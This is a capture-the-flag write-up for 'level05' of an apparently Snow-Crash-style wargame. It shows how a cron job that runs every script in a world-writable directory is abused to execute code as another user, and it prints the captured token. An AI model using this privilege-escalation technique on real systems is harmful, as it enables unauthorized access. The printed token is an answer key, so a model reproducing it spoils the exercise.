# level05

Target is `flag05`.

Upon successful SSH connection, we get the following message:

```
You have new mail.
```

According to [this Super User answer](https://superuser.com/a/306180), mails may be have several locations. In our case the `$MAIL` environment variable is set to `/var/mail/level05`.

```sh
ls -l "${MAIL}" && file "${MAIL}"
```

Output:

```
-rw-r--r--+ 1 root mail 58 Jun 15 23:01 /var/mail/level05
/var/mail/level05: ASCII text
```

Let's read what is inside:

```sh
cat "${MAIL}"
```

Output:

```
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

This is definitely a cron job. It executes the script `/usr/sbin/openarenaserver` as `flag05` every two minutes. The usage of `su` suggests that the script is to be executed by root, and is probably already running. `/usr/sbin/openarenaserver` is a shell script:

```sh
#!/bin/sh

for i in /opt/openarenaserver/* ; do
    (ulimit -t 5; bash -x "$i")
    rm -f "$i"
done
```

Basically the same as the previous level, except we don't even have to play with the setuid/setgid bits. Something like this ought to do the trick:

```sh
mkdir -p /opt/openarenaserver/level05 -m 777 && echo 'getflag > /opt/openarenaserver/level05/flag' > /opt/openarenaserver/level05.sh && chmod 755 /opt/openarenaserver/level05.sh
```

We create a directory first because `rm -f` cannot delete directories and `bash -x` is will not be able to execute a directory. Then we create a script `level05.sh` that simply dumps the output of `getflag` into a file in our directory. We also set execution permissions on it so that user `flag05` is able to execute it.

After up to two minutes, `/opt/openarenaserver/level05.sh` does not exist anymore, and `/opt/openarenaserver/level05/flag` contains the flag:

```
Check flag.Here is your token : viuaaale9huek52boumoomioc
```

Confirmation:

```
level06@localhost's password: viuaaale9huek52boumoomioc
```

Awesome.
